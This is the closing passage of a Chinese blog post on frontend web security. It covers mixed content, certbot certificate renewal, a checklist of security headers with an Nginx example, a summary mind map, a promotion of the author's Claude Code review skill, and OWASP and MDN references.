<p><strong>3. 避免混合内容（Mixed Content）</strong></p>
<p>HTTPS 页面里不要加载 HTTP 资源，否则浏览器会警告或阻止：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 危险 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 安全 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 协议相对路径（自动匹配当前页面协议） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>检查混合内容：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 检测页面是否有混合内容</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https'</span>));

<span class="hljs-comment">// 监听混合内容警告</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'securitypolicyviolation'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Mixed content:'</span>, e);
});
</code></pre>
<p><strong>4. 证书有效期</strong></p>
<p>记得续期证书。可以用 Let's Encrypt 免费证书，配合 certbot 自动续期：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 certbot</span>
apt-get install certbot python3-certbot-nginx

<span class="hljs-comment"># 获取证书</span>
certbot --nginx -d example.com

<span class="hljs-comment"># 自动续期（cron job）</span>
0 0 * * * certbot renew --quiet
</code></pre>
<hr/>
<h2 data-id="heading-25">安全 HTTP 响应头清单</h2>
<p>除了前面提到的 CSP、X-Frame-Options、HSTS，还有几个重要的安全头：</p>
<h3 data-id="heading-26">1. X-Content-Type-Options</h3>
<p>禁止浏览器 MIME 类型嗅探：</p>
<pre><code class="hljs language-css" lang="css">X-<span class="hljs-attribute">Content</span>-Type-Options: nosniff
</code></pre>
<p>防止浏览器把 <code>text/plain</code> 文件当 JavaScript 执行。</p>
<h3 data-id="heading-27">2. Referrer-Policy</h3>
<p>控制 Referer 头泄露多少信息：</p>
<pre><code class="hljs language-sql" lang="sql">Referrer<span class="hljs-operator">-</span>Policy: strict<span class="hljs-operator">-</span>origin<span class="hljs-operator">-</span><span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">cross</span><span class="hljs-operator">-</span>origin
</code></pre>
<p>可选值：</p>
<ul>
<li><code>no-referrer</code>：不发送</li>
<li><code>no-referrer-when-downgrade</code>：HTTPS→HTTP 不发送</li>
<li><code>origin</code>：只发送域名</li>
<li><code>strict-origin-when-cross-origin</code>：跨域只发送域名（推荐）</li>
</ul>
<h3 data-id="heading-28">3. Permissions-Policy</h3>
<p>限制浏览器功能（原 Feature-Policy）：</p>
<pre><code class="hljs language-ini" lang="ini">Permissions-Policy: <span class="hljs-attr">geolocation</span>=(), microphone=(), camera=(), payment=()
</code></pre>
<p>禁止页面访问摄像头、麦克风、地理位置等。</p>
<h3 data-id="heading-29">4. X-XSS-Protection（已过时）</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">X-XSS-Protection: 0</span>
</code></pre>
<p>这个头已经过时了，现代浏览器不再推荐使用。用 CSP 代替。</p>
<h3 data-id="heading-30">完整配置示例</h3>
<pre><code class="hljs language-nginx" lang="nginx"># Nginx 配置
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'" always;
</code></pre>
<h3 data-id="heading-31">检测工具</h3>
<p>用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fsecurityheaders.com" target="_blank" title="https://securityheaders.com" ref="nofollow noopener noreferrer">securityheaders.com</a> 检测你的网站缺少哪些安全头，会给出评分和改进建议。</p>
<hr/>
<h2 data-id="heading-32">小结</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((前端安全))
    输入安全
      XSS防御
        转义输出
        textContent
        DOMPurify
        CSP
      验证过滤
    请求安全
      CSRF防御
        Token
        SameSite Cookie
      CORS配置
        白名单
        限制方法
    传输安全
      HTTPS
      HSTS
      证书管理
    存储安全
      HttpOnly Cookie
      避免localStorage存敏感数据
    依赖安全
      版本锁定
      npm audit
      私有源
</code></pre>
<p>前端安全的核心思路：</p>
<ol>
<li><strong>不信任任何输入</strong>：用户输入、URL 参数、第三方数据，都要验证和转义</li>
<li><strong>最小权限原则</strong>：Cookie 设置 HttpOnly、Secure、SameSite；CSP 限制资源加载；CORS 白名单</li>
<li><strong>纵深防御</strong>：不要依赖单一防护手段，多层防护叠加</li>
<li><strong>保持更新</strong>：依赖版本、安全补丁、浏览器新特性</li>
</ol>
<p>具体措施速查：</p>
<ul>
<li><strong>XSS 防御</strong>：用 <code>textContent</code>、转义 HTML、DOMPurify、HttpOnly Cookie、CSP</li>
<li><strong>CSRF 防御</strong>：CSRF Token、SameSite Cookie、验证请求来源</li>
<li><strong>点击劫持防御</strong>：X-Frame-Options、CSP frame-ancestors、SameSite Cookie</li>
<li><strong>CORS 安全</strong>：白名单验证 Origin，不动态反射，限制方法和头</li>
<li><strong>依赖安全</strong>：锁定版本、npm ci、定期审计、禁用脚本、私有源、减少依赖</li>
<li><strong>存储安全</strong>：不存敏感数据到 localStorage，用 HttpOnly Cookie，实现过期机制</li>
<li><strong>传输安全</strong>：强制 HTTPS、HSTS、避免混合内容、Let's Encrypt 自动续期</li>
<li><strong>HTTP 头</strong>：CSP、X-Frame-Options、HSTS、X-Content-Type-Options、Referrer-Policy、Permissions-Policy</li>
</ul>
<p>安全是个持续的过程，不是一劳永逸的事。定期审计代码、更新依赖、关注安全公告，才能持续保障系统安全。</p>
<hr/>
<p>写这篇文章的时候，代码示例都用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> 过了一遍。这是我写的 Claude Code 代码审查技能，能自动检测这篇文章里提到的 XSS、CSRF、不安全的 localStorage 使用这些问题。</p>
<p>主要功能：</p>
<ul>
<li><strong>安全漏洞检测</strong>：XSS、CSRF、注入攻击、敏感数据暴露</li>
<li><strong>框架适配</strong>：React、Vue、TypeScript、Node.js 都能用</li>
<li><strong>最佳实践检查</strong>：代码规范、性能问题、可维护性</li>
</ul>
<p>用 Claude Code 的话直接装上就能用，review 代码的时候省不少事。仓库里有详细的安装说明和使用示例。</p>
<p><strong>GitHub</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">tt-a1i/code-review-skill</a></p>
<p>觉得有用的话给个 star，有问题欢迎提 issue。</p>
<hr/>
<h2 data-id="heading-33">参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fowasp.org%2FTop10%2F2025%2F0x00_2025-Introduction%2F" target="_blank" title="https://owasp.org/Top10/2025/0x00_2025-Introduction/" ref="nofollow noopener noreferrer">OWASP Top 10:2025</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSRF Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCSP" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" ref="nofollow noopener noreferrer">Content Security Policy - MDN</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FContent_Security_Policy_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSP Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FCSRF_prevention" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSRF_prevention" ref="nofollow noopener noreferrer">MDN - CSRF Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FClickjacking" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Clickjacking" ref="nofollow noopener noreferrer">MDN - Clickjacking Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fportswigger.net%2Fweb-security%2Fcors" target="_blank" title="https://portswigger.net/web-security/cors" ref="nofollow noopener noreferrer">PortSwigger - CORS Security</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F599242750" target="_blank" title="https://zhuanlan.zhihu.com/p/599242750" ref="nofollow noopener noreferrer">npm 安全：防止供应链攻击</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2019%2F09%2Fcookie-samesite.html" target="_blank" title="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html" ref="nofollow noopener noreferrer">SameSite Cookie 属性</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wosign.com%2FNews%2Fhttpsjiami_20180817.htm" target="_blank" title="https://www.wosign.com/News/httpsjiami_20180817.htm" ref="nofollow noopener noreferrer">HTTPS 加密原理</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fexlink2012%2Farticle%2Fdetails%2F147940289" target="_blank" title="https://blog.csdn.net/exlink2012/article/details/147940289" ref="nofollow noopener noreferrer">前端安全：XSS、CSRF 防御与最佳实践</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>